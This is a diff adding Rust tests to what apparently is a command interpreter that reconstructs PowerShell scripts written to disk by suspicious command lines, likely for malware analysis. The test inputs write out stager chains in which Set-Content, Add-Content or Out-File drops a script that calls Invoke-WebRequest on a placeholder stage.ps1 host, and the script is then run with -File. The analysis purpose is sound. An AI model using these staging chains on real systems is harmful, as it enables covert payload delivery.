@@ -10625,6 +10625,104 @@ powershell -NoProfile -File "%TEMP%\copied.ps1""#,
     }
 
     #[test]
+    fn powershell_set_content_value_preserves_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-set-content-value.example/stage.ps1".to_vec();
+
+        interpret_line(
+            r#"powershell -Command "Set-Content -Path C:\Temp\stage.ps1 -Value 'Invoke-WebRequest https://ps-set-content-value.example/stage.ps1'""#,
+            &mut env,
+        );
+        interpret_line(r#"powershell -NoProfile -File C:\Temp\stage.ps1"#, &mut env);
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Set-Content -Value script content was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn powershell_add_content_value_preserves_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-add-content-value.example/stage.ps1".to_vec();
+
+        interpret_line(
+            r#"powershell -Command "Add-Content -Path C:\Temp\stage.ps1 -Value 'Invoke-WebRequest https://ps-add-content-value.example/stage.ps1'""#,
+            &mut env,
+        );
+        interpret_line(r#"powershell -NoProfile -File C:\Temp\stage.ps1"#, &mut env);
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Add-Content -Value script content was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn powershell_add_content_value_appends_to_existing_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-add-content-append.example/stage.ps1".to_vec();
+
+        interpret_line(
+            r#"powershell -Command "Set-Content -Path C:\Temp\stage.ps1 -Value 'Invoke-WebRequest'""#,
+            &mut env,
+        );
+        interpret_line(
+            r#"powershell -Command "Add-Content -Path C:\Temp\stage.ps1 -Value ' https://ps-add-content-append.example/stage.ps1'""#,
+            &mut env,
+        );
+        interpret_line(r#"powershell -NoProfile -File C:\Temp\stage.ps1"#, &mut env);
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Add-Content -Value did not append script content: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn powershell_out_file_input_object_preserves_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-out-file-input-object.example/stage.ps1".to_vec();
+
+        interpret_line(
+            r#"powershell -Command "Out-File -FilePath C:\Temp\stage.ps1 -InputObject 'Invoke-WebRequest https://ps-out-file-input-object.example/stage.ps1'""#,
+            &mut env,
+        );
+        interpret_line(r#"powershell -NoProfile -File C:\Temp\stage.ps1"#, &mut env);
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Out-File -InputObject script content was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn powershell_out_file_append_input_object_appends_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-out-file-append-input.example/stage.ps1".to_vec();
+
+        interpret_line(
+            r#"powershell -Command "Out-File -FilePath C:\Temp\stage.ps1 -InputObject 'Invoke-WebRequest'""#,
+            &mut env,
+        );
+        interpret_line(
+            r#"powershell -Command "Out-File -Append -FilePath C:\Temp\stage.ps1 -InputObject ' https://ps-out-file-append-input.example/stage.ps1'""#,
+            &mut env,
+        );
+        interpret_line(r#"powershell -NoProfile -File C:\Temp\stage.ps1"#, &mut env);
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Out-File -Append -InputObject did not append script content: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
     fn nested_powershell_encoded_command_extracts() {
         let payload = "Write-Host nested";
         let utf16: Vec<u8> = payload
